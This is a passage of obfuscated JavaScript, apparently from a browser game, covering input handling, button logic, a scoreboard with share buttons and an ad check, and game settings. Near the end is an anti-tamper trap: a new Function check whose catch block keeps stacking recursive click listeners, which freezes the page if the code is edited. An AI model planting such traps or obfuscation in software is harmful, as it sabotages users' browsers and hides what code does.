						if (ⲆᐃⲆΔ[ΔᐃⲆⵠⲆⵠΔ[72]] && (0 > ⲆᐃⲆΔ.id || ⲆᐃⲆΔ.id == Ⲇⵠⵠ[ⵠᐃ].id) || ᐃᐃΔ.ΔⲆᐃⲆⵠ[ΔᐃⲆⵠⲆⵠΔ[72]] && ᐃᐃ.ⵠⲆⲆᐃ == Ⲇⵠⵠ[ⵠᐃ].id || ᐃᐃΔ.Ⲇⵠⵠⵠⵠ[ΔᐃⲆⵠⲆⵠΔ[72]] && ᐃᐃ.ΔⵠⵠⵠΔ === Ⲇⵠⵠ[ⵠᐃ].id || ᐃᐃΔ.ᐃΔᐃΔ[ΔᐃⲆⵠⲆⵠΔ[72]] && (Ⲇⵠⵠ[ⵠᐃ].id == ᐃᐃ.ⵠⲆⲆᐃ || ᐃᐃ.ⵠᐃⲆⵠᐃ == Ⲇⵠⵠ[ⵠᐃ].id) || ᐃᐃΔ.ΔΔΔⵠ[ΔᐃⲆⵠⲆⵠΔ[72]] && Ⲇⵠⵠ[ⵠᐃ].id == ᐃᐃ.ⵠⲆⲆⲆⵠ || ᐃᐃΔ.ⲆΔΔⲆ[ΔᐃⲆⵠⲆⵠΔ[72]] && Ⲇⵠⵠ[ⵠᐃ].id == ᐃᐃ.ⵠⲆⲆᐃ) {
							ΔⲆΔᐃⵠ |= ᐃᐃᐃ.ΔΔᐃⵠⲆ[Ⲇⵠⵠ[ⵠᐃ].id].ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ΔᐃᐃΔⲆ)
						}
					}
				}
				if (ᐃᐃΔ.ⵠΔΔⲆ.id < 0 && 0 > ᐃᐃΔ.ⵠΔΔⲆ.ᐃΔᐃᐃ    && !ᐃᐃΔ.ⵠⵠⲆⵠⵠ) {
					var Ⲇⵠⵠ = ᐃᐃΔ.ⵠΔΔⲆ.ⵠⵠᐃΔᐃ;
					for (var ⵠᐃ = ᐃⵠⲆⵠ; Ⲇⵠⵠ.length > ⵠᐃ; ⵠᐃ++) {
						var ⲆΔᐃⵠⲆΔᐃ = ᐃⵠⵠᐃΔ;
						ⲆΔᐃⵠⲆΔᐃ = Ⲇⵠⵠ[ⵠᐃ].ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ΔᐃᐃΔⲆ);
						ΔⲆΔᐃⵠ |= ΔⵠⵠⲆ.Δᐃᐃᐃᐃ.ⵠΔⵠⲆ(ⲆΔᐃⵠⲆΔᐃ, Ⲇⵠⵠ[ⵠᐃ], 1)
					}
				}
				ⲆΔⵠ > ᐃᐃΔ.ⵠΔΔⲆ.id && ᐃᐃΔ.ⵠΔΔⲆ.ᐃΔᐃᐃ < ᐃⵠⲆⵠ && ᐃᐃΔ.ΔᐃᐃⲆΔ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ΔΔΔΔ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ⵠⵠᐃᐃ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.options[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ⵠΔⵠⲆⵠ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ᐃⲆᐃⲆ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ⲆⵠⵠⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[72]] && (ΔⲆΔᐃⵠ |= ᐃᐃᐃ.ΔᐃᐃⲆΔ.button.ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ΔᐃᐃΔⲆ));
				ᐃⵠⲆ > ᐃᐃΔ.ⵠΔΔⲆ.ᐃΔᐃᐃ && !ᐃᐃᐃ.ⵠⵠᐃᐃ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.options[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ⵠΔⵠⲆⵠ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ᐃⲆᐃⲆ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ⲆⵠⵠⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[72]] && 1 === ᐃᐃᐃ.ⵠᐃΔᐃⵠⵠⵠ && (ΔⲆΔᐃⵠ |= ᐃᐃᐃ.ΔΔΔΔ.button.ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ΔᐃᐃΔⲆ));
				Δᐃᐃᐃ > ᐃᐃΔ.ⵠΔΔⲆ.ᐃΔᐃᐃ && !ᐃᐃᐃ.ΔΔΔΔ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ⵠⵠᐃᐃ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ⵠΔⵠⲆⵠ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ᐃⲆᐃⲆ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ⲆⵠⵠⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[72]] && (ΔⲆΔᐃⵠ |= ᐃᐃᐃ.options.button.ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ΔᐃᐃΔⲆ));
				ᐃᐃΔ.ⵠΔΔⲆ.ᐃΔᐃᐃ < ⲆΔⵠ && !ᐃᐃᐃ.ΔΔΔΔ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ⵠⵠᐃᐃ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ⵠΔⵠⲆⵠ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ᐃⲆᐃⲆ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.options[ΔᐃⲆⵠⲆⵠΔ[72]] && 1 === ᐃᐃᐃ.ⲆⲆⲆΔⲆᐃⲆ && (ΔⲆΔᐃⵠ |= ᐃᐃᐃ.ⲆⵠⵠⲆᐃ.button.ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ΔᐃᐃΔⲆ));
				if (ᐃᐃΔ.ⵠΔΔⲆ.ᐃΔᐃᐃ < 0 && !ᐃᐃᐃ.ΔΔΔΔ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ⵠⵠᐃᐃ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ⵠΔⵠⲆⵠ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ᐃⲆᐃⲆ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.options[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ⲆⵠⵠⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[72]]) {
					ⲆⲆⵠⲆ.ⲆΔΔᐃⵠ ? ΔⲆΔᐃⵠ |= ᐃᐃᐃ.ⲆⲆⵠⲆ.ⲆΔΔⲆⵠᐃⲆ.ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ΔᐃᐃΔⲆ) : ΔⲆΔᐃⵠ |= ᐃᐃᐃ.ⲆⲆⵠⲆ.ΔᐃᐃⲆᐃᐃᐃ.ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ΔᐃᐃΔⲆ)
				}
				ᐃᐃΔ.ⵠΔΔⲆ.ᐃΔᐃᐃ < ΔⲆⵠⲆ && !ᐃᐃᐃ.ΔΔΔΔ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ⵠⵠᐃᐃ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.options[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ⵠΔⵠⲆⵠ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ⲆⵠⵠⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[72]] && ΔᐃᐃΔ.ⵠᐃᐃⲆᐃ !== ⲆⲆⲆ.mode && ⲆⲆⲆ.mode !== ΔᐃᐃΔ.ⲆⲆⵠⵠⲆ && ⲆⲆⲆ.mode !== ΔᐃᐃΔ.ΔΔⲆᐃᐃⲆⲆⲆᐃ && ᐃᐃᐃ.ᐃΔΔΔⵠᐃⲆ === 1 && (ΔⲆΔᐃⵠ |= ᐃᐃᐃ.ᐃⲆᐃⲆ.button.ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ΔᐃᐃΔⲆ));
				if (ΔⲆΔᐃⵠ !== ᐃᐃᐃ.ΔᐃⵠⵠᐃⲆᐃ) {
					ᐃᐃᐃ.ΔᐃⵠⵠᐃⲆᐃ = ΔⲆΔᐃⵠ;
					ΔⲆΔᐃⵠ ? Ⲇⵠ.style[ⵠ[333]] = ᐃᐃᐃ.ᐃΔΔΔⵠⲆΔ : Ⲇⵠ.style[ⵠ[333]] = ᐃᐃᐃ.ᐃⵠⲆᐃᐃΔⵠ
				}
			};
			this.ᐃⲆᐃⲆᐃⲆΔ = function() {
				ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[419], this.ᐃΔΔᐃᐃⵠⲆ, ⲆⲆᐃⵠᐃ);
				ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[215], this.ΔⵠⵠᐃᐃᐃΔ, false);
				ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[137], this.ⲆⲆⵠᐃᐃⵠΔ, false);
				ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[277]]("keyup", this.ⵠⲆⵠΔΔⵠΔ, false);
				ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[277]]("keydown", this.ⵠⵠⵠⲆⵠΔᐃ, ⲆΔⵠⲆΔ)
			};
			this.ⵠᐃΔⲆΔⵠⲆ = function() {
				ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[133]](ⵠ[419], this.ᐃΔΔᐃᐃⵠⲆ, false);
				ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[133]](ⵠ[215], this.ΔⵠⵠᐃᐃᐃΔ, ΔΔⵠⲆΔ);
				ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[133]](ⵠ[137], this.ⲆⲆⵠᐃᐃⵠΔ, ⲆΔⵠⲆΔ);
				ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[133]]("keyup", this.ⵠⲆⵠΔΔⵠΔ, ⲆΔᐃⲆΔ);
				ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[133]]("keydown", this.ⵠⵠⵠⲆⵠΔᐃ, false)
			}
		}

		function ⲆᐃᐃΔΔᐃⲆⵠⲆ(ΔΔᐃⵠΔⲆⲆ, ⵠΔΔⲆᐃᐃΔ, ⵠⲆⲆᐃᐃΔⵠ) {
			const ⵠⵠⲆⲆⲆᐃΔ = ΔΔᐃⵠΔⲆⲆ ^ 60350;
			const ⲆΔᐃⵠⵠⵠΔ = ~(12618 & ⵠΔΔⲆᐃᐃΔ) & 12618 | ~(12618 & ⵠΔΔⲆᐃᐃΔ) & ⵠΔΔⲆᐃᐃΔ;
			const ΔᐃⵠⲆᐃⵠⵠ = (0 << (ⵠⲆⲆᐃᐃΔⵠ >> 0 & 255)) + (8 << (ⵠⲆⲆᐃᐃΔⵠ >> 24 & 255)) + (24 << (ⵠⲆⲆᐃᐃΔⵠ >> ΔᐃᐃΔⵠ & ⵠⲆⵠⵠᐃⲆⵠ)) + (16 << (ⵠⲆⲆᐃᐃΔⵠ >> 8 & 255));
			const ΔⲆᐃⵠᐃΔᐃ = ΔⵠⲆΔΔᐃⲆ(ⵠⵠⲆⲆⲆᐃΔ, ⲆΔᐃⵠⵠⵠΔ, ΔᐃⵠⲆᐃⵠⵠ);
			const ⵠⵠΔΔⵠⲆⲆ = ΔⵠⲆΔΔᐃⲆ(ⵠⵠⲆⲆⲆᐃΔ, ⲆΔᐃⵠⵠⵠΔ, ΔᐃⵠⲆᐃⵠⵠ);
			const ΔⲆⵠⲆΔΔΔⵠⵠ = (16 << ((ΔⲆᐃⵠᐃΔᐃ ^ ⵠⵠΔΔⵠⲆⲆ) >> ΔᐃΔⲆⲆ & 255)) + (0 << ((ΔⲆᐃⵠᐃΔᐃ ^ ⵠⵠΔΔⵠⲆⲆ) >> 0 & 255)) + (ΔⵠⲆᐃⲆ << ((ΔⲆᐃⵠᐃΔᐃ ^ ⵠⵠΔΔⵠⲆⲆ) >> 24 & 255)) + (24 << ((ΔⲆᐃⵠᐃΔᐃ ^ ⵠⵠΔΔⵠⲆⲆ) >> ᐃᐃΔⵠⵠⵠΔ & ⲆΔⲆᐃΔⲆᐃ));
			return ΔⲆⵠⲆΔΔΔⵠⵠ
		}

		function ⲆᐃⲆⲆⲆΔΔ(ⲆⲆΔᐃⵠⲆᐃ, ΔΔᐃΔⵠΔⵠᐃⲆ, ᐃΔⲆⵠⲆΔⲆ, ΔⵠⲆᐃⵠⲆⲆ, ⲆΔΔΔⲆⲆⵠ) {
			const ᐃⵠΔⵠⲆⲆⵠ = (ⲆⲆΔᐃⵠⲆᐃ | 15838) & ~(15838 & ⲆⲆΔᐃⵠⲆᐃ);
			const ᐃΔᐃⲆⵠᐃⲆᐃⲆ = (1 + (14561 + ΔΔᐃΔⵠΔⵠᐃⲆ) * 22695477) % 4294967296;
			const ΔⲆΔⲆⵠⲆΔⲆΔ = ~(ᐃΔⲆⵠⲆΔⲆ & 56441) & 56441 | ~(56441 & ᐃΔⲆⵠⲆΔⲆ) & ᐃΔⲆⵠⲆΔⲆ;
			const ΔⵠⵠⲆᐃⲆᐃⲆⲆ = (8 << (ΔⵠⲆᐃⵠⲆⲆ >> 8 & 255)) + (ⲆⲆⲆΔΔ << (ΔⵠⲆᐃⵠⲆⲆ >> 0 & ΔΔᐃΔⲆ)) + (24 << (ΔⵠⲆᐃⵠⲆⲆ >> 16 & 255)) + (0 << (ΔⵠⲆᐃⵠⲆⲆ >> 24 & 255));
			const ⵠᐃΔⲆⵠᐃⵠⲆⵠ = (21389 | ⲆΔΔΔⲆⲆⵠ) & ~(21389 & ⲆΔΔΔⲆⲆⵠ);
			const ᐃⵠΔⲆΔΔᐃⲆⲆ = ΔⲆΔΔⲆΔⵠ(ᐃⵠΔⵠⲆⲆⵠ, ᐃΔᐃⲆⵠᐃⲆᐃⲆ, ΔⲆΔⲆⵠⲆΔⲆΔ);
			const ⲆⵠⲆⵠᐃⲆᐃⲆⲆ = ΔⲆΔΔⲆΔⵠ(ΔⵠⵠⲆᐃⲆᐃⲆⲆ, ⵠᐃΔⲆⵠᐃⵠⲆⵠ, ᐃⵠΔⵠⲆⲆⵠ);
			const ⵠⲆᐃᐃⵠΔⵠⵠⲆ = (12345 + 1103515245 * ((ᐃⵠΔⲆΔΔᐃⲆⲆ ^ ⲆⵠⲆⵠᐃⲆᐃⲆⲆ) + 45911)) % 2147483648;
			return ⵠⲆᐃᐃⵠΔⵠⵠⲆ
		}

		function ⵠⵠΔⲆⵠⵠⵠᐃⵠ(Ⲇⵠ, Δ) {
			this.Ⲇⵠ = Ⲇⵠ;
			this.Δ = Δ;
			var ᐃᐃᐃ = this;
			this.ΔᐃⵠΔᐃⲆΔ = false;
			this.ᐃⵠⵠᐃⲆⵠⲆ = {
				id: document[ΔᐃⲆⵠⲆⵠΔ[68]]("scoreboard"),
				style: document[ΔᐃⲆⵠⲆⵠΔ[68]]("scoreboard").style,
				height: 0,
				translate: {
					x: 0,
					y: ⵠⲆⲆ
				},
				"ⵠⲆᐃ": function() {
					this.style.left = this.translate.x + ⵠ[39];
					this.style.top = this.translate.y + ⵠ[39]
				},
				"ⲆⲆⲆΔⵠ": function() {
					this.id[ΔᐃⲆⵠⲆⵠΔ[290]] = '<div style="position:absolute;"> <img src="./img/scoreboard.png"style="width:250px;transform:translate(125px, -80px);"> </img> </div><div><div id="whokilled">' + ᐃᐃΔ.ΔᐃΔⲆⲆᐃᐃ.ⲆᐃΔᐃⲆΔⵠ + '</div></div><div class="deco" style="margin-top:35px;"></div><div class="deco"></div><div><div class="stats"> ' + ΔⵠΔ[ⲆⲆΔ.ⲆᐃᐃⵠⲆⲆᐃ] + ⵠ[517] + ᐃᐃΔ.ᐃΔⲆ + '</div><div class="stats"> ' + ΔⵠΔ[ⲆⲆΔ.ⲆᐃⵠⵠΔΔΔ] + ⵠ[517] + ᐃᐃΔ.ΔᐃΔⲆⲆᐃᐃ.ⲆᐃᐃⲆᐃ + "</div></div>" + '<div id="flexDisplay"><div id="score"> ' + ΔⵠΔ[ⲆⲆΔ.ⵠΔΔᐃᐃᐃⵠ] + ⵠ[517] + ᐃᐃΔ.ΔᐃΔⲆⲆᐃᐃ.ᐃⵠᐃⵠⵠ + '</div><div id="breadWon"><span id="breadWonInner">0</span><img src="./img/golden-bread.png" style="width:50px;margin-left:-25px;transform: translate(37px, 8px);"></img></div></div><div><div id="points"> ' + ᐃᐃΔ.ΔᐃΔⲆⲆᐃᐃ.ΔΔΔᐃⲆⲆᐃ + " " + ΔⵠΔ[ⲆⲆΔ.POINTS] + '</div></div><div id="shop_points">' + ΔⵠΔ[ⲆⲆΔ.ⲆᐃΔᐃᐃᐃⵠ] + '</div><div style="display:inline-block;"><div class="social" id="tttwitter">' + ΔⵠΔ[ⲆⲆΔ.ΔⵠⵠᐃᐃΔⵠ] + '</div><div class="social" id="fffacebook">' + ΔⵠΔ[ⲆⲆΔ.ΔⵠᐃⲆⲆⲆΔ] + '</div></div><div id="bbback">' + ΔⵠΔ[ⲆⲆΔ.ᐃⲆΔᐃᐃⵠᐃ] + ⵠ[123];
					this.style.display = ⵠ[35];
					document[ΔᐃⲆⵠⲆⵠΔ[68]]("tttwitter")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[215], ᐃΔᐃΔΔⲆᐃΔΔ, false);
					document[ΔᐃⲆⵠⲆⵠΔ[68]]("bbback")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[215], (function() {
						ᐃΔⵠⲆⲆΔᐃ.ⵠΔΔΔᐃ(ⵠⲆᐃΔ.ⲆΔΔᐃⵠ)
					}), ΔⵠΔⲆΔ);
					document[ΔᐃⲆⵠⲆⵠΔ[68]]("fffacebook")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[215], ΔⵠⵠⵠΔⵠᐃⵠⲆ, ⵠᐃⵠᐃᐃ);
					this.height = Math.floor(this.id[ΔᐃⲆⵠⲆⵠΔ[163]] / ⲆⲆΔᐃ);
					ᐃΔⲆⲆᐃᐃᐃᐃⵠ()
				}
			};
			var ΔⲆⲆⲆΔ = 0;
			var ΔᐃΔᐃᐃ = 30;
			var ΔⵠᐃⲆΔⲆΔ = function() {
				ᐃᐃᐃ.ⵠⲆᐃ();
				ΔⲆⲆⲆΔ++;
				if (ΔⲆⲆⲆΔ == ΔᐃΔᐃᐃ) {
					ᐃᐃᐃ.ⵠⲆᐃ();
					return
				}
				ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[275]](ΔⵠᐃⲆΔⲆΔ, 0)
			};
			this.ⵠΔΔΔᐃ = function(ΔⲆⵠΔΔ) {
				ᐃᐃᐃ.ΔᐃⵠΔᐃⲆΔ === ᐃⲆᐃᐃⲆ && (ᐃᐃᐃ.ΔᐃⵠΔᐃⲆΔ = false, ⲆΔⲆΔᐃ = ΔⲆⵠΔΔ, ᐃΔΔᐃⵠ = -ᐃΔᐃⲆ, ⵠⲆⲆᐃΔ(), ᐃⲆⵠᐃΔⵠⵠ())
			};
			var ⲆΔⲆΔᐃ;
			var ᐃΔΔᐃⵠ = -1;
			var ᐃⲆΔΔᐃ = 30;
			var ⵠⲆⲆᐃΔ = function() {
				ᐃᐃᐃ.ⵠⲆᐃ();
				ᐃΔΔᐃⵠ++;
				if (ᐃΔΔᐃⵠ == ᐃⲆΔΔᐃ) {
					ᐃᐃᐃ.stop();
					ᐃᐃᐃ.ᐃⵠⵠᐃⲆⵠⲆ.style.display = ⵠ[465];
					ⲆΔⲆΔᐃ();
					return
				}
				ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[275]](ⵠⲆⲆᐃΔ, 0)
			};
			this.ⲆΔⲆᐃⵠ = false;
			this.stop = function() {
				this.ⲆΔⲆᐃⵠ = ΔᐃⵠᐃⲆ
			};
			this.ⲆΔΔᐃⵠ = function() {
				check_ads();
				document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[406]).style.backgroundColor = Ⲇ.ⲆⵠΔⲆᐃ[ΔⵠⵠᐃΔ.time];
				ᐃᐃᐃ.ᐃⵠⵠᐃⲆⵠⲆ.ⲆⲆⲆΔⵠ();
				ⵠⲆᐃΔ.ΔⲆⵠⵠⲆ.style.display = ⵠ[35];
				ᐃᐃᐃ.ⲆΔⲆᐃⵠ = true;
				ᐃᐃᐃ.ΔᐃⵠΔᐃⲆΔ = true;
				ᐃΔΔᐃⵠ = -ΔⵠΔⵠ;
				ΔⲆⲆⲆΔ = ᐃⵠⲆⵠ;
				ΔⵠᐃⲆΔⲆΔ()
			};
			this.ⵠⲆᐃ = function() {
				this.ᐃⵠⵠᐃⲆⵠⲆ.translate.x = Math.floor(Δᐃⵠᐃ - 275);
				this.ᐃⵠⵠᐃⲆⵠⲆ.translate.y = Math.floor(ᐃΔⵠᐃ - this.ᐃⵠⵠᐃⲆⵠⲆ.height - 28);
				ⵠⲆᐃΔ.ΔⲆⵠⵠⲆ.translate.x = this.ᐃⵠⵠᐃⲆⵠⲆ.translate.x - 350;
				ⵠⲆᐃΔ.ΔⲆⵠⵠⲆ.translate.y = this.ᐃⵠⵠᐃⲆⵠⲆ.translate.y + 0;
				ⵠⲆᐃΔ.ΔⲆⵠⵠⲆ.ⵠⲆᐃ();
				if (ΔᐃΔᐃᐃ != ΔⲆⲆⲆΔ || ᐃΔΔᐃⵠ != -1) {
					var ΔᐃⵠΔ = 0;
					if (ΔⲆⲆⲆΔ != ΔᐃΔᐃᐃ) {
						var ΔᐃⵠΔ = 1500 / (ΔⲆⲆⲆΔ + ΔⵠⲆΔ) - 50
					}
					if (ᐃΔΔᐃⵠ != -ΔᐃᐃⲆ) {
						var ΔᐃⵠΔ = -(1750 / (ᐃⲆΔΔᐃ - ᐃΔΔᐃⵠ + 1) - 48)
					}
					this.ᐃⵠⵠᐃⲆⵠⲆ.translate.y -= ΔᐃⵠΔ
				}
				this.ᐃⵠⵠᐃⲆⵠⲆ.ⵠⲆᐃ()
			};
			this.ΔᐃΔⵠ = function() {
				ΔᐃΔⲆⲆᐃΔ();
				ᐃᐃΔ.alert.ΔᐃΔⵠ(ⵠ[253], ⵠ[481])
			}
		}
		var ᐃⵠᐃⵠⲆ = {
			"ⲆΔⲆᐃⲆ": ΔⵠΔⵠ,
			"ᐃⲆΔᐃⵠΔⲆ": 1
		};
		var ᐃⲆΔᐃ = {
			"ΔⵠⲆⲆⵠ": 2,
			"ⵠΔⲆⵠΔⲆⵠ": 3e3,
			"ΔⲆᐃⲆⵠⲆᐃⲆⵠ": 5e3,
			"ⵠⲆⵠⵠⲆ": ΔⵠⲆᐃⲆ,
			"ⲆⲆᐃ": ᐃⲆⲆⲆ,
			"ΔⵠⵠΔᐃ": ⵠⵠⵠⵠ,
			"ⲆⲆⲆⵠᐃᐃⵠΔⲆ": ⵠⲆᐃᐃⲆ,
			"ⲆᐃᐃⵠᐃⲆⲆΔⲆ": 5e3,
			"ΔΔΔΔⵠᐃⲆⲆⵠ": 5e3,
			"ⵠⲆⲆⲆᐃⵠᐃ": 12,
			"ᐃⲆΔΔᐃⲆΔ": 46e4,
			"ᐃᐃᐃΔⲆᐃⵠΔⲆ": 12,
			"ᐃⲆᐃΔᐃ": 1
		};
		var ⵠⵠⲆᐃⲆ = [];

		function ⵠᐃⵠΔΔⵠⲆ() {
			return 8614747
		}
		const ⵠⲆⲆⲆⵠⲆⲆ = 10444907;
		const ᐃᐃΔᐃᐃᐃΔ = ⵠᐃⵠΔΔⵠⲆ + " let ᐃⲆⲆΔ = ⵠᐃⵠΔΔⵠⲆ () * 2250262; return ᐃⲆⲆΔ;";
		const ⵠⲆⵠᐃΔᐃⵠ = new Function(ᐃᐃΔᐃᐃᐃΔ);
		try {
			ⵠⲆⵠᐃΔᐃⵠ(ⵠⲆⲆⲆⵠⲆⲆ)
		} catch (e) {
			const ⵠⲆⲆⲆⵠⲆⲆ = function() {
				for (let ᐃᐃΔᐃᐃᐃΔ = 0; ᐃᐃΔᐃᐃᐃΔ < 5; ᐃᐃΔᐃᐃᐃΔ++) ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[277]]("click", (function() {
					ⵠⲆⲆⲆⵠⲆⲆ()
				}))
			};
			ⵠⲆⲆⲆⵠⲆⲆ()
		}
		ⵠⵠⲆᐃⲆ[-ΔⵠΔⵠ] = ᐃⲆΔᐃ.ᐃⲆᐃΔᐃ;
		ⵠⵠⲆᐃⲆ[ᐃᐃ.ⵠⵠⲆⵠⲆ] = ᐃⲆΔᐃ.ᐃⲆᐃΔᐃ;
		ⵠⵠⲆᐃⲆ[ᐃᐃ.ⵠⲆⲆⵠⵠ] = ᐃⲆΔᐃ.ᐃⲆᐃΔᐃ;
		ⵠⵠⲆᐃⲆ[ᐃᐃ.ΔⲆⲆΔⵠⵠᐃΔᐃ] = ᐃⲆΔᐃ.ΔⵠⲆⲆⵠ;
		ⵠⵠⲆᐃⲆ[ᐃᐃ.ΔᐃⲆΔⲆ] = ᐃⲆΔᐃ.ΔⵠⲆⲆⵠ;
		ⵠⵠⲆᐃⲆ[ᐃᐃ.ⲆⵠᐃⵠΔ] = ᐃⲆΔᐃ.ΔⵠⲆⲆⵠ;
		ⵠⵠⲆᐃⲆ[ᐃᐃ.ΔΔⲆⵠⲆ] = ᐃⲆΔᐃ.ΔⵠⲆⲆⵠ;
		ⵠⵠⲆᐃⲆ[ᐃᐃ.ⵠⲆⲆΔⲆ] = ᐃⲆΔᐃ.ΔⵠⲆⲆⵠ;
		ⵠⵠⲆᐃⲆ[ᐃᐃ.ⵠⲆⵠΔᐃ] = ᐃⲆΔᐃ.ΔⵠⲆⲆⵠ;
		ⵠⵠⲆᐃⲆ[ᐃᐃ.ⵠⲆᐃΔⲆ] = ᐃⲆΔᐃ.ΔⵠⲆⲆⵠ;
		ⵠⵠⲆᐃⲆ[ᐃᐃ.ⲆᐃⲆⲆΔ] = ᐃⲆΔᐃ.ΔⵠⲆⲆⵠ;
		ⵠⵠⲆᐃⲆ[ᐃᐃ.ΔΔⵠᐃᐃ] = ᐃⲆΔᐃ.ΔⵠⲆⲆⵠ;
		ⵠⵠⲆᐃⲆ[ᐃᐃ.ⲆᐃⵠΔᐃ] = ᐃⲆΔᐃ.ΔⵠⲆⲆⵠ;
		ⵠⵠⲆᐃⲆ[ᐃᐃ.ⵠⲆⵠⲆᐃ] = ᐃⲆΔᐃ.ΔⵠⲆⲆⵠ;
		ⵠⵠⲆᐃⲆ[ᐃᐃ.ΔⲆⲆΔᐃ] = ᐃⲆΔᐃ.ΔⵠⲆⲆⵠ;
		ⵠⵠⲆᐃⲆ[ᐃᐃ.ⵠᐃⲆⵠΔ] = ᐃⲆΔᐃ.ΔⵠⲆⲆⵠ;
		ⵠⵠⲆᐃⲆ[ᐃᐃ.ᐃΔⵠᐃⵠ] = ᐃⲆΔᐃ.ΔⵠⲆⲆⵠ;
		ⵠⵠⲆᐃⲆ[ᐃᐃ.ⵠⵠᐃⲆⲆ] = ᐃⲆΔᐃ.ΔⵠⲆⲆⵠ;
		ⵠⵠⲆᐃⲆ[ᐃᐃ.ⲆⲆᐃΔᐃΔⲆⵠΔ] = ᐃⲆΔᐃ.ΔⵠⲆⲆⵠ;
		ⵠⵠⲆᐃⲆ[ᐃᐃ.ᐃᐃΔⲆΔ] = ᐃⲆΔᐃ.ΔⵠⲆⲆⵠ;
		ⵠⵠⲆᐃⲆ[ᐃᐃ.ⲆⲆⵠΔⲆ] = ᐃⲆΔᐃ.ΔⵠⲆⲆⵠ;
		ⵠⵠⲆᐃⲆ[ᐃᐃ.ΔⵠΔΔⲆ] = ᐃⲆΔᐃ.ΔⵠⲆⲆⵠ;
		ⵠⵠⲆᐃⲆ[ᐃᐃ.ⵠⵠⲆΔⲆ] = ᐃⲆΔᐃ.ΔⵠⲆⲆⵠ;
		ⵠⵠⲆᐃⲆ[ᐃᐃ.ΔᐃΔΔΔ] = ᐃⲆΔᐃ.ΔⵠⲆⲆⵠ;
		ⵠⵠⲆᐃⲆ[ᐃᐃ.ⲆⲆⵠᐃⵠ] = ᐃⲆΔᐃ.ΔⵠⲆⲆⵠ;
